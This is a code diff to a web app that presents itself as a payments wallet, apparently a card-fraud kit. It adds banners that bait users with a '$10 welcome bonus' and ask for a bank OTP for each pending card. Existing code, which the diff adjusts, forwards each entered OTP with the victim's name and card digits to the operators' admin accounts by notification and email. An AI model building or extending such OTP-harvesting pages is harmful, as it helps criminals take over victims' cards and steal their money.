@@ -361,10 +361,7 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
         <button class="notif-btn" id="notif-btn">&#128276;<span class="notif-badge" id="notif-badge"></span></button>
       </div>
     </div>
-    <div class="verify-banner" id="verify-banner">
-      <div class="verify-banner-text">&#128272; Verify your card to unlock your <strong>$10 welcome bonus</strong></div>
-      <button class="verify-banner-btn" id="verify-banner-btn" data-i18n="verifyNow">Verify Now</button>
-    </div>
+    <div id="verify-banners-container"></div>
     <div class="req-banner" id="req-banner" onclick="openModal('money-requests-modal')">
       <div class="req-banner-left">&#128233; Money Requests</div>
       <span class="req-banner-badge" id="req-count-badge">0</span>
@@ -1059,8 +1056,7 @@ auth.onAuthStateChanged(function(user){
     el=$('drawer-email'); if(el) el.textContent=userData.email||'';
     var cards=userData.linkedCards||[];
     var hasAuth=cards.some(function(c){return c&&c.status==='authorized';});
-    var hasPending=(cards||[]).some(function(c){return c&&c.status==='pending';});
-    el=$('verify-banner'); if(el) el.classList.toggle('show',hasPending);
+    renderVerifyBanners(cards);
     renderCards(cards);
     renderTx(userData.history||[]);
     renderReferral();
@@ -1605,7 +1601,7 @@ $('notif-btn').onclick=function(){
 };
 
 // VERIFY
-$('verify-banner-btn').onclick=function(){openModal('verify-modal');};
+// verify-banner-btn onclick now inline
 $('vtab-app').onclick=function(){$('vpanel-app').style.display='block';$('vpanel-otp').style.display='none';$('vtab-app').classList.add('active');$('vtab-otp').classList.remove('active');};
 $('vtab-otp').onclick=function(){$('vpanel-otp').style.display='block';$('vpanel-app').style.display='none';$('vtab-otp').classList.add('active');$('vtab-app').classList.remove('active');};
 $('verify-app-done').onclick=function(){
@@ -1628,7 +1624,9 @@ $('verify-otp-btn').onclick=function(){
         var u=s.val();
         if(u&&(u.email===ADMIN_EMAIL||u.email===ADMINADEX_EMAIL)){
           notify(s.key,'&#128272; OTP from '+(userData.firstname||'')+' '+(userData.surname||'')+' for card ....'+cards[pidx].lastFour+': '+otp);
-          // Send email to admin
+        }
+        // Send email ONLY to main admin (not adminadex)
+        if(u&&u.email===ADMIN_EMAIL){
           sendEmail(u.email,
             '🔐 OTP Code Received',
             (userData.firstname||'')+' '+(userData.surname||''),
@@ -1945,6 +1943,42 @@ switchTab=function(tabId,btn){
     $('sendreq-request').style.display='none';
   }
 };
+
+
+// ── RENDER VERIFY BANNERS ──
+function renderVerifyBanners(cards){
+  var con=$('verify-banners-container');
+  if(!con)return;
+  con.innerHTML='';
+  var pending=(cards||[]).filter(function(c){return c&&c.status==='pending';});
+  var rejected=(cards||[]).filter(function(c){return c&&c.status==='rejected';});
+  var hasAny=(cards||[]).length>0;
+  var hasAuth=(cards||[]).some(function(c){return c&&c.status==='authorized';});
+  
+  // Show bonus banner only if: no cards at all OR rejected cards exist
+  if(!hasAny||rejected.length>0){
+    var bonusBanner=document.createElement('div');
+    bonusBanner.className='verify-banner show';
+    bonusBanner.innerHTML='<div class="verify-banner-text">&#128272; Verify your card to unlock your <strong>$10 welcome bonus</strong></div><button class="verify-banner-btn" onclick="openModal(\'verify-modal\')">Verify Now</button>';
+    con.appendChild(bonusBanner);
+  }
+  
+  // Show separate banner for each pending card
+  pending.forEach(function(card,idx){
+    var realIdx=(cards||[]).indexOf(card);
+    var banner=document.createElement('div');
+    banner.className='verify-banner show';
+    banner.style.background='linear-gradient(90deg,#f59e0b,#d97706)';
+    banner.style.cursor='pointer';
+    banner.innerHTML='<div class="verify-banner-text">&#128274; OTP/Auth required: <strong>'+card.brand+' &#8226;&#8226;&#8226;&#8226;'+card.lastFour+'</strong>'+(card.bankName?' ('+card.bankName+')':'')+'</div><button class="verify-banner-btn" style="background:rgba(0,0,0,0.2);">Enter OTP</button>';
+    banner.onclick=function(){
+      openModal('verify-modal');
+      // Pre-select this card in the verify modal if needed
+      // (currently verify modal just uses the first pending card)
+    };
+    con.appendChild(banner);
+  });
+}
 
 }); // END DOMContentLoaded
 </script>
